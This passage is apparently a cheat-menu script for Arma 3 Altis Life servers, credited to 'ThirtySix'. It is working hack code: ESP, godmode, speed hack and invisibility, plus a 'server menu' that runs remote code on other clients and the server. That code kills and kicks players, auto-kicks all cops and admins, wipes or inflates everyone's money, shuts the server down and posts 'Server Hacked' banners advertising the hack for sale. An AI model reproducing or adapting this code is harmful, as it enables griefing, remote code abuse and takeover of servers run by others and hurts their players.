                                        _pos = visiblePosition _x;
                                        _l44 = createMarkerLocal[format["CRW%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 00, _pos select 1, 0]];
                                        _l8 = (gettext(configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'displayName'));
                                        _l44 setMarkerTextLocal format['%1---%2---%3m', name _x, _l8, round(_x distance player)];
                                        _l44 setMarkerTypeLocal "mil_dot";
                                        if ((side _x == side player) and(side _x != resistance)) then {
                                            _l44 setMarkerColorLocal "ColorBlue";
                                        } else {
                                            _l44 setMarkerColorLocal "ColorRed";
                                        };
                                        _l44 setMarkerSizeLocal[1, 1];
                                        ThirtySix_Noobs set[count ThirtySix_Noobs, _x];
                                        [_x, _l44, _l45] spawn {
                                            private["_l46", "_l47", "_l48"];
                                            _l46 = _this select 0;
                                            _l47 = _this select 1;
                                            while {
                                                (ThirtySix_Map_Markers == 1) and(alive _l46) and(vehicle _l46 != _l46) and(getPlayerUID _l46 != "")
                                            }
                                            do {
                                                _l48 = ((crew vehicle _l46) find _l46);
                                                _l47 setMarkerPosLocal([(visiblePosition _l46 select 0) + 00, (visiblePosition _l46 select 1) - (25 + _l48 * 20), 0]);
                                                uiSleep 0.01;
                                            };
                                            deleteMarkerLocal _l47;
                                            if (_l46 in ThirtySix_Noobs) then {
                                                ThirtySix_Noobs set[(ThirtySix_Noobs find _l46), -1];
                                                ThirtySix_Noobs = ThirtySix_Noobs - [-1];
                                            };
                                            true;
                                        };
                                    };
                                }
                                forEach crew vehicle _x;
                            };
                        } else {
                            if (!(_x in ThirtySix_Bitches) and(vehicle _x == _x) and(getPlayerUID _x != "")) then {
                                private["_pos", "_l44"];
                                _pos = visiblePosition _x;
                                _l44 = createMarkerLocal[format["PLR%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 00, _pos select 1, 0]];
                                _l44 setMarkerTypeLocal "mil_dot";
                                _l44 setMarkerSizeLocal[1, 1];
                                if ((side _x == side player) and(side _x != resistance)) then {
                                    _l44 setMarkerColorLocal "ColorWhite";
                                } else {
                                    _l44 setMarkerColorLocal "ColorRed";
                                };
                                _l44 setMarkerTextLocal format["%1---%2", name _x, round(_x distance player)];
                                if (_x == player) then {
                                    _l44 setMarkerColorLocal "ColorGreen";
                                };
                                ThirtySix_Bitches set[count ThirtySix_Bitches, _x];
                                [_x, _l44] spawn {
                                    private["_l46", "_l47"];
                                    _l46 = _this select 0;
                                    _l47 = _this select 1;
                                    while {
                                        (ThirtySix_Map_Markers == 1) and(alive _l46) and(vehicle _l46 == _l46) and(getPlayerUID _l46 != "")
                                    }
                                    do {
                                        _l47 setMarkerPosLocal([visiblePosition _l46 select 0, visiblePosition _l46 select 1, 0]);
                                        uiSleep 0.01;
                                    };
                                    deleteMarkerLocal _l47;
                                    if (_l46 in ThirtySix_Bitches) then {
                                        ThirtySix_Bitches set[(ThirtySix_Bitches find _l46), -1];
                                        ThirtySix_Bitches = ThirtySix_Bitches - [-1];
                                    };
                                    true;
                                };
                            };
                        };
                    }
                    forEach playableUnits;
                    uiSleep 0.3;
                }; {
                    _l44 = str _x;
                    deleteMarkerLocal _l44;
                }
                forEach playableUnits;
            }, "", 50];
            player addAction["Esp Markers", {
                if (isnil("ThirtySix_ESP")) then {
                    ThirtySix_ESP = 0;
                };
                if (ThirtySix_ESP == 0) then {
                    ThirtySix_ESP = 1;
                    hint "ThirtySix_ESP \n by ThirtySix \n ON";
                } else {
                    ThirtySix_ESP = 0;
                    hint "ThirtySix_ESP \n by ThirtySix \n OFF";
                };
                if (ThirtySix_ESP == 1) then {
                    onEachFrame {
                        _l49 = nearestobjects[player, ["CAManBase"], 1500]; {
                            if ((side _x != side player) && (getPlayerUID _x != "") && ((player distance _x) < 1500)) then {
                                drawIcon3D["", [1, 0, 0, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(player distance _x), name _x]), 1, 0.04, "TahomaB"]
                            } else {
                                if ((getPlayerUID _x != "") && ((player distance _x) < 1500)) then {
                                    drawIcon3D["", [0, 0.5, 1, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(player distance _x), name _x]), 1, 0.04, "TahomaB"]
                                };
                            };
                        }
                        foreach playableUnits;
                    };
                } else {
                    onEachFrame {
                        nil
                    };
                };
            }, "", 50];
            player addAction["GodMode", {
                if (isNil("ThirtySix_God")) then {
                    ThirtySix_God = 0;
                };
                if (ThirtySix_God == 0) then {
                    ThirtySix_God = 1;
                    hint "Godmode \n by ThirtySix \n ON";
                    player removeAllEventHandlers "handleDamage";
                    player addEventHandler["handleDamage", {
                        false
                    }];
                    player allowDamage false;
                    vehicle player removeAllEventHandlers "handleDamage";
                    vehicle player addEventHandler["handleDamage", {
                        false
                    }];
                    vehicle player allowDamage false;
                } else {
                    ThirtySix_God = 0;
                    hint "Godmode \n by ThirtySix \n OFF";
                    player addEventHandler["handleDamage", {
                        true
                    }];
                    player removeAllEventHandlers "handleDamage";
                    player allowDamage true;
                    vehicle player addEventHandler["handleDamage", {
                        true
                    }];
                    vehicle player removeAllEventHandlers "handleDamage";
                    vehicle player allowDamage true;
                };
            }, "", 50];
            player addAction["Unlimit Ammo", {
                if (isnil("ThirtySix_Unlim_Ammo")) then {
                    ThirtySix_Unlim_Ammo = 0;
                };
                if (ThirtySix_Unlim_Ammo == 0) then {
                    ThirtySix_Unlim_Ammo = 1;
                    hint "Unlimit Ammo \n by ThirtySix \n ON";
                } else {
                    ThirtySix_Unlim_Ammo = 0;
                    hint "Unlimit Ammo \n by ThirtySix \n OFF";
                };
                while {
                    ThirtySix_Unlim_Ammo == 1
                }
                do {
                    _l25 = primaryWeapon player;
                    _l31 = secondaryWeapon player;
                    player setAmmo[_l25, 999];
                    player setAmmo[_l31, 999];
                    (vehicle player) setVehicleAmmo 1;
                    (vehicle player) setVehicleAmmo 1;
                    uiSleep 0.01;
                };
            }, "", 50];
            player addAction["Unlimit Sprint", {
                if (isnil("ThirtySix_Sprint")) then {
                    ThirtySix_Sprint = 0;
                };
                if (ThirtySix_Sprint == 0) then {
                    ThirtySix_Sprint = 1;
                    hint "Unlimit Sprint \n by ThirtySix \n ON";
                } else {
                    ThirtySix_Sprint = 0;
                    hint "Unlimit Sprint \n by ThirtySix \n OFF";
                };
                while {
                    ThirtySix_Sprint == 1
                }
                do {
                    player setFatigue 0;
                };
            }, "", 50];
            player addAction["Rapid Fire", {
                if (isnil("ThirtySix_Rapid")) then {
                    ThirtySix_Rapid = 0;
                };
                if (ThirtySix_Rapid == 0) then {
                    ThirtySix_Rapid = 1;
                    hint "Rapid Fire \n by ThirtySix \n ON";
                } else {
                    ThirtySix_Rapid = 0;
                    hint "Rapid Fire \n by ThirtySix \n OFF";
                };
                while {
                    ThirtySix_Rapid == 1
                }
                do {
                    (vehicle player) setWeaponReloadingTime[(vehicle player), currentWeapon(vehicle player), 0];
                    player setWeaponReloadingTime[player, currentWeapon player, 0];
                    uiSleep 0.01;
                };
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["<t color='#FFFF00'>No Recoil</t>", {
                if (isnil("ThirtySix_NoRecoil")) then {
                    ThirtySix_NoRecoil = 0;
                };
                if (ThirtySix_NoRecoil == 0) then {
                    ThirtySix_NoRecoil = 1;
                    hint "No Recoil \n by ThirtySix \n ON";
                    (vehicle player) setUnitRecoilCoefficient 0;
                } else {
                    ThirtySix_NoRecoil = 0;
                    hint "No Recoil \n by ThirtySix \n OFF";
                    (vehicle player) setUnitRecoilCoefficient 1;
                };
            }, "", 50];
            player addAction["ExplosivShot", {
                if (isNil "ThirtySix_ExplosivShot") then {
                    ThirtySix_ExplosivShot = 0
                };
                if (ThirtySix_ExplosivShot == 0) then {
                    ThirtySix_ExplosivShot = 1;
                    vehicle player removeAllEventHandlers "Fired";
                    hint "Super Explosiv Bullets \n by ThirtySix \n ON";
                    vehicle player addeventhandler["Fired", {
                        call BigFuckinBullets
                    }];
                    BigFuckinBullets = {
                        if (isNull cursorTarget) then {
                            TargetPlayer = screenToWorld[0.5, 0.5];
                        } else {
                            TargetPlayer = getpos cursorTarget;
                        };
                        _spwnboom = "HelicopterExploBig"
                        createVehiclelocal TargetPlayer; /*_spwnboom = "HelicopterExploBig" createVehiclelocal TargetPlayer;_spwnboom = "Bo_FAB_250" createVehiclelocal TargetPlayer;_spwnboom = "Sh_120_HE" createVehiclelocal TargetPlayer;_spwnboom = "Bo_Mk82" createVehiclelocal TargetPlayer;*/
                    };
                } else {
                    ThirtySix_ExplosivShot = 0;
                    hint "Super Explosiv Bullets \n by ThirtySix \n OFF";
                    vehicle player removeAllEventHandlers "Fired";
                };
            }, "", 50];
            player addAction["Speed Hack", {
                if (isnil("ThirtySix_Speed")) then {
                    ThirtySix_Speed = 0;
                };
                if (ThirtySix_Speed == 0) then {
                    ThirtySix_Speed = 1;
                    hint "Speehack \n by ThirtySix \n ON";
                    waituntil {
                        !isnull(finddisplay 46)
                    };
                    Speedhaxxx = (findDisplay 46) displayAddEventHandler["KeyDown", "_this select 1 call MY_KEYDOWN_FNC;false;"];
                    MY_KEYDOWN_FNC = {
                        _vehicle_player = vehicle player;
                        if (_vehicle_player == player) exitwith {};
                        _nos = _vehicle_player getvariable "boost_shiftl";
                        _supgrade = _vehicle_player getvariable "boost_e";
                        if (isEngineOn _vehicle_player) then {
                            switch (_this) do {
                                case 18:
                                    /* KEY E */ {
                                        if (isEngineOn _vehicle_player and!isnil "_supgrade") then {
                                            _vehicle_player SetVelocity[(velocity _vehicle_player select 0) * 1.15, (velocity _vehicle_player select 1) * 1.07, (velocity _vehicle_player select 2) * 0.99];
                                        } else {
                                            _vehicle_player setvariable["boost_e", 1, true];
                                        };
                                    };
                                case 42:
                                    /* KEY SHIFTL */ {
                                        if (isEngineOn _vehicle_player and!isnil "_nos") then {
                                            _vehicle_player setVelocity[(velocity _vehicle_player select 0) * 1.03, (velocity _vehicle_player select 1) * 1.1, (velocity _vehicle_player select 2) * 1.00];
                                        } else {
                                            _vehicle_player setvariable["boost_shiftl", 1, true];
                                        };
                                    };
                            };
                        };
                    };
                } else {
                    ThirtySix_Speed = 0;
                    hint "Speehack \n by ThirtySix \n OFF";
                    (findDisplay 46) displayRemoveEventHandler["KeyDown", Speedhaxxx];
                    _nos = nil;
                    _vehicle_player = nil;
                };
            }, "", 50];
            player addAction["Invisible", {
                if (isnil("ThirtySix_Invis")) then {
                    ThirtySix_Invis = 0;
                };
                if (ThirtySix_Invis == 0) then {
                    ThirtySix_Invis = 1;
                    hint "Invis \n by ThirtySix \n ON";
                } else {
                    ThirtySix_Invis = 0;
                    hint "Invis \n by ThirtySix \n OFF";
                };
                if (ThirtySix_Invis == 1) then {
                    Invis_Name = name player;
                    [{
                        {
                            if (name _x == Invis_Name) then {
                                _x hideObjectGlobal true
                            };
                        }
                        foreach playableUnits;
                    }, "BIS_fnc_spawn", false, true] spawn BIS_fnc_MP;
                } else {
                    [{
                        {
                            if (name _x == Invis_Name) then {
                                _x hideObjectGlobal false
                            };
                        }
                        foreach playableUnits;
                    }, "BIS_fnc_spawn", false, true] spawn BIS_fnc_MP;
                };
            }, "", 50];
            player addAction["License", {
                life_licenses = [ /*["license_cop_air","cop"],["license_cop_swat","cop"],["license_cop_cg","cop"],["license_civ_driver","civ"],["license_civ_air","civ"],["license_civ_heroin","civ"],["license_civ_marijuana","civ"],["license_civ_gang","civ"],["license_civ_boat","civ"],["license_civ_oil","civ"],["license_civ_dive","civ"],["license_civ_truck","civ"],["license_civ_gun","civ"],["license_civ_rebel","civ"],["license_civ_coke","civ"],["license_civ_diamond","civ"],["license_civ_copper","civ"],["license_civ_iron","civ"],["license_civ_sand","civ"],["license_civ_salt","civ"],["license_civ_cement","civ"]*/
                    ["license_civ_driver", "civ"],
                    ["license_civ_truck", "civ"],
                    ["license_civ_air", "civ"],
                    ["license_civ_gun", "civ"],
                    ["license_civ_rebel", "civ"],
                    ["license_civ_diamond", "civ"],
                    ["license_civ_heroin", "civ"],
                    ["license_civ_marijuana", "civ"]
                ]; {
                    missionNamespace setVariable[(_x select 0), true];
                }
                foreach life_licenses;
                hint "Licens are given \n by ThirtySix";
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Restrain Target", {
                hint format["%1 was restrained \n by ThirtySix", name cursorTarget];
                cursorTarget setVariable["restrained", true, true];
                [
                    [cursorTarget], "life_fnc_restrain", cursorTarget, false
                ] spawn life_fnc_MP;
            }, "", 50];
            player addAction["Unrestrain Target", {
                hint format["%1 was released \n by ThirtySix", name cursorTarget];
                cursorTarget setVariable["restrained", false, true];
            }, "", 50];
            player addAction["Unrestrain Myself", {
                hint "You are free \n by ThirtySix";
                player setVariable["restrained", FALSE, TRUE];
            }, "", 50];
            player addAction["Escort on", {
                cursorTarget attachTo[player, [0.1, 1.1, 0]];
                cursorTarget setVariable["transporting", false, true];
                cursorTarget setVariable["Escorting", true, true];
            }, "", 50];
            player addAction["Escort off", {
                detach cursorTarget;
                cursorTarget setVariable["Escorting", false, true];
            }, "", 50];
            player addAction["Jail Target", {
                cursorTarget setPos(getMarkerPos "jail_marker");
            }, "", 50];
            player addAction["Unjail Target", {
                cursorTarget setPos(getMarkerPos "jail_release");
            }, "", 50];
        };
        ServerMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Kill one <t color='#FFFF00'>Player</t>", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "player SetDamage 100;"] call ThirtySix;
                                hint format["%1 has been killed by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Kick one <t color='#FFFF00'>Player</t>", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "failMission'LOSER'; 0 fadeSound 0; for'_l39'from 0 to 100 do{(findDisplay _l39)closeDisplay 0;};"] call ThirtySix;
                                hint format["%1 has been kicked by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Kick all <t color='#0000FF'>Cops</t>", {
                if (isnil("Cop_Admins")) then {
                    Cop_Admins = 0;
                };
                if (Cop_Admins == 0) then {
                    Cop_Admins = 1;
                    hint "Auto Cop kick \n by ThirtySix \n ON";
                } else {
                    Cop_Admins = 0;
                    hint "Auto Cop kick \n by ThirtySix \n OFF";
                };
                while {
                    Cop_Admins == 1
                }
                do {
                    [TRUE, "if(call life_coplevel > 0) then {failMission'LOSER'; 0 fadeSound 0; for'_l39'from 0 to 100 do{(findDisplay _l39)closeDisplay 0;};};"] call ThirtySix;
                    uiSleep 15;
                };
            }, "", 50];
            player addAction["Kick all <t color='#FF0000'>Admins</t>", {
                if (isnil("Kick_Admins")) then {
                    Kick_Admins = 0;
                };
                if (Kick_Admins == 0) then {
                    Kick_Admins = 1;
                    hint "Auto Admin kick \n by ThirtySix \n ON";
                } else {
                    Kick_Admins = 0;
                    hint "Auto Admin kick \n by ThirtySix \n OFF";
                };
                while {
                    Kick_Admins == 1
                }
                do {
                    [TRUE, "if(call life_adminlevel > 0) then {failMission'LOSER'; 0 fadeSound 0; for'_l39'from 0 to 100 do{(findDisplay _l39)closeDisplay 0;};};"] call ThirtySix;
                    uiSleep 15;
                };
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Add Inventory", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 3];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 3];
                player addAction["Add 1 Pickaxe", {
                    life_inv_pickaxe = life_inv_pickaxe + 1;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 3 Lockpick", {
                    life_inv_lockpick = life_inv_lockpick + 3;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 3 Water", {
                    life_inv_water = life_inv_water + 3;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 3 Apple", {
                    life_inv_apple = life_inv_apple + 3;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 3 Coffee", {
                    life_inv_coffee = life_inv_coffee + 3;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 3 Donut", {
                    life_inv_donuts = life_inv_donuts + 3;
                    hint "Item Added";
                }, "", 3];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 3];
                player addAction["Add 25 Diamond", {
                    life_inv_diamond = life_inv_diamond + 25;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 25 Chopper", {
                    life_inv_copperr = life_inv_copperr + 25;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 25 Salt", {
                    life_inv_saltr = life_inv_saltr + 25;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 100 Cocain", {
                    life_inv_cokep = life_inv_cokep + 100;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 100 Heroin", {
                    life_inv_heroinp = life_inv_heroinp + 100;
                    hint "Item Added";
                }, "", 3];
                player addAction["Add 100 Marijuana", {
                    life_inv_marijuana = life_inv_marijuana + 100;
                    hint "Item Added";
                }, "", 3];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 3];
            }, "", 50];
            player addAction["Give me Money", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                player addAction["  5k", {
                    life_Cash = Life_Cash + 5000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction[" 25k", {
                    life_Cash = Life_Cash + 25000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction[" 50k", {
                    life_Cash = Life_Cash + 50000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["100k", {
                    life_Cash = Life_Cash + 100000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["250k", {
                    life_Cash = Life_Cash + 250000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["500k", {
                    life_Cash = Life_Cash + 500000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                player addAction["  1kk", {
                    life_Cash = Life_Cash + 1000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["  2kk", {
                    life_Cash = Life_Cash + 2000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["  5kk", {
                    life_Cash = Life_Cash + 5000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction[" 10kk", {
                    life_Cash = Life_Cash + 10000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction[" 25kk", {
                    life_Cash = Life_Cash + 25000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction[" 50kk", {
                    life_Cash = Life_Cash + 50000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["100kk", {
                    life_Cash = Life_Cash + 100000000;
                    hint "You got Money \n by ThirtySix";
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
            }, "", 50];
            player addAction["Reset my Money", {
                life_Cash = 0;
                life_atmCash = 0;
            }, "", 50];
            player addAction["Money all (0)", {
                [TRUE, "life_cash = 36; life_atmcash = 36;"] call ThirtySix;
                hint "All players got fucked \n by ThirtySix";
            }, "", 50];
            player addAction["Money all (36 Mil)", {
                [TRUE, "life_cash = 36363636; life_atmcash = 36363636;"] call ThirtySix;
                hint "All players got 10Mil \n by ThirtySix";
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Time Day", {
                [FALSE, "if(isServer) then {while {true} do {setDate [2012, 9, 1, 11, 0]; uiSleep 5;};};"] call ThirtySix;
                hint "Time: Day (Please Wait)";
            }, "", 50];
            player addAction["Time Night", {
                [FALSE, "if(isServer) then {while {true} do {setDate [2012, 9, 1, 24, 0]; uiSleep 5;};};"] call ThirtySix;
                hint "Time: Night (Please Wait)";
            }, "", 50];
            player addAction["Broadcast", {
                [TRUE, "hint 'Server Hacked \n by ThirtySix';"] call ThirtySix;
            }, "", 50];
            player addAction["Newsbanner", {
                if (isnil("THIRTYSIX_News_Banner")) then {
                    THIRTYSIX_News_Banner = 0;
                };
                if (THIRTYSIX_News_Banner == 0) then {
                    THIRTYSIX_News_Banner = 1;
                    hint "News Banner On";
                    [TRUE, "[parseText'<t size=''1.8'' color=''#CA278C''>This Server is now owned ===> Hacked by ThirtySix </t><br/><t color=''#CA278C''>If you wanna buy this Hack, just add me on Steam: ThirtySix_Arma</t>',parseText'<t size=''1.2''color=''#FE2E2E''>HACKED </t><t size=''1.2''color=''#FACC2E''>HACKED </t><t size=''1.2''color=''#80FF00''>HACKED </t><t size=''1.2''color=''#00FF00''>HACKED </t><t size=''1.2''color=''#2EFE9A''>HACKED </t><t size=''1.2''color=''#00FFFF''>HACKED </t><t size=''1.2''color=''#0174DF''>HACKED </t><t size=''1.2''color=''#013ADF''>HACKED </t><t size=''1.2''color=''#3A01DF''>HACKED </t><t size=''1.2''color=''#A901DB''>HACKED </t><t size=''1.2''color=''#DF0174''>HACKED </t><t size=''1.2''color=''#00FFFF''>HACKED </t>']spawn BIS_fnc_AAN;"] call ThirtySix;
                } else {
                    THIRTYSIX_News_Banner = 0;
                    hint "News Banner Off";
                    [TRUE, "(uinamespace getvariable 'BIS_AAN') closedisplay 1;"] call ThirtySix;
                };
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["ServerDown", {
                [TRUE, "failMission'LOSER';"] call ThirtySix;
                hint "All Players has been kicked by ThirtySix";
            }, "", 50];
            player addAction["<t color='#FF00FF'>Executer</t>", {
                execvm "_src\test.sqf";
            }, "", 50];
        };
        If(alive Dummy) then {
            player addAction["Switch to Dummy", {
                {
                    _x = player;
                    first = _x;
                    _x = vehicle Dummy;
                    second = _x;
                    secondowner = owner _x;
                }
                foreach playableunits;
                first remotecontrol second;
                vehicle second switchcamera "EXTERNAL";
                hint "Press F3 to switch back \n by ThirtySix";
            }, "", 50];
        };
        Dummy_Menu = {
            Dummy addaction["<t color='#000000'>----------------------</t>", {
                Hint "Dummy FTW! :D";
            }, "", 50];
            Dummy addAction["- Destroy Target", {
                _dt = cursorTarget;
                cursorTarget setDamage 100;
                hint format["%1 \n Damaged \n by ThirtySix", _dt];
            }, "", 50];
            Dummy addAction["- Vehicle EMP", {
                [cursorTarget, "vehicle player setFuel 0;"] call ThirtySix;
                hint format["%1 \n Vehicle Stopped \n by ThirtySix", cursorTarget];
            }, "", 50];
            Dummy addAction["- Teleport on Mapclick", {
                openMap[true, false];
                onMapSingleClick '_pos1 = [(_pos select 0), (_pos select 1), 0]; vehicle Dummy setPos _pos1;hint format [ "%1 \n was teleported to \n %2 \n by ThirtySix", name Dummy, _pos1] onMapSingleClick "";openMap [false, false];';
            }, "", 50];
            Dummy addAction["- Teleport to Player", {
                removeallactions Dummy;
                Dummy addaction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions Dummy;
                    call Dummy_Menu;
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %1 \n ----------------------------------------------- \n ", _CountAllUnits];
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            Dummy addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                vehicle Dummy setPos[(getpos _player select 0) + 15, (getpos _player select 1) + 15, (getpos _player select 2)];
                                hint format["You have been Ported to \n %1 \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            Dummy addAction["- Vehicle Spawn", {
                removeallactions Dummy;
                Dummy addaction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions Dummy;
                    call Dummy_Menu;
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    Hint "Dummy FTW! :D";
                }, "", 50];
                Dummy addAction["Spawn Quadbike", {
                    _svtp = createVehicle["B_G_Quadbike_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Gocart", {
                    _svtp = createVehicle["C_Kart_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                Dummy addAction["Spawn Hatchback", {
                    _svtp = createVehicle["C_Hatchback_01_sport_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Offroad", {
                    _svtp = createVehicle["C_Offroad_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn SUV", {
                    _svtp = createVehicle["C_SUV_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Truck", {
                    _svtp = createVehicle["B_Truck_01_covered_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                Dummy addAction["Spawn Strider", {
                    _svtp = createVehicle["I_MRAP_03_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Strider HMG", {
                    _svtp = createVehicle["I_MRAP_03_hmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Strider GMG", {
                    _svtp = createVehicle["I_MRAP_03_gmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Hunter", {
                    _svtp = createVehicle["B_MRAP_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Hunter HMG", {
                    _svtp = createVehicle["B_MRAP_01_hmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Hunter GMG", {
                    _svtp = createVehicle["B_MRAP_01_gmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Ifrit", {
